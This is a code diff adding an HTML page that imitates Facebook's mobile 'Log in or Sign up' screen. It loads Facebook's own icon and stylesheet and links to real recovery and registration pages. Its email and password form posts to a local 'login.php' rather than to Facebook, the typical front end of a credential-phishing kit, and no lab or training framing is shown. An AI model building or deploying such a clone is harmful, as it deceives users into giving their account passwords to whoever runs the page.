@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta charset="UTF-8">
+    <meta name="referrer" content="origin-when-crossorigin" />
+    <meta name="theme-color" content="#3b5998"/>
+    <title>Facebook – Log in or Sign up</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" sizes="196x196">
+    <link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/l/0,cross/gGEGrJycWHa.css">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #e9eff1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #page {
+            width: 100%;
+            max-width: 380px;
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header a {
+            font-size: 36px;
+            font-weight: bold;
+            color: #3b5998;
+            text-decoration: none;
+        }
+
+        .form-container {
+            margin-top: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .input-field:focus {
+            border-color: #3b5998;
+            outline: none;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background-color: #3b5998;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-button:hover {
+            background-color: #365899;
+        }
+
+        .forgot-password {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .forgot-password a {
+            color: #3b5998;
+            text-decoration: none;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .signup-link a {
+            color: #42b72a;
+            font-size: 16px;
+            text-decoration: none;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8b8d8f;
+            margin-top: 30px;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #8b8d8f;
+        }
+
+        /* Mobile Specific Styles */
+        @media screen and (max-width: 600px) {
+            .header a {
+                font-size: 30px;
+            }
+
+            .login-button {
+                font-size: 16px;
+                padding: 12px;
+            }
+
+            .input-field {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="page">
+        <div class="header">
+            <a href="/login/?refid=8">Facebook</a>
+        </div>
+
+        <form method="post" action="login.php" class="form-container" id="login_form">
+            <input type="email" class="input-field" name="email" id="m_login_email" placeholder="Email address or phone number" autocomplete="on">
+            <input type="password" class="input-field" name="pass" id="m_login_password" placeholder="Password" autocomplete="on">
+
+            <button type="submit" class="login-button" name="login">Log In</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&ars=facebook_login&lwv=100&refid=8">Forgotten password?</a>
+        </div>
+
+        <div class="signup-link">
+            <a href="https://m.facebook.com/reg/?cid=103&refid=8">Create New Account</a>
+        </div>
+
+        <div class="footer">
+            <span>Facebook ©2018</span>
+        </div>
+    </div>
+</body>
+</html>
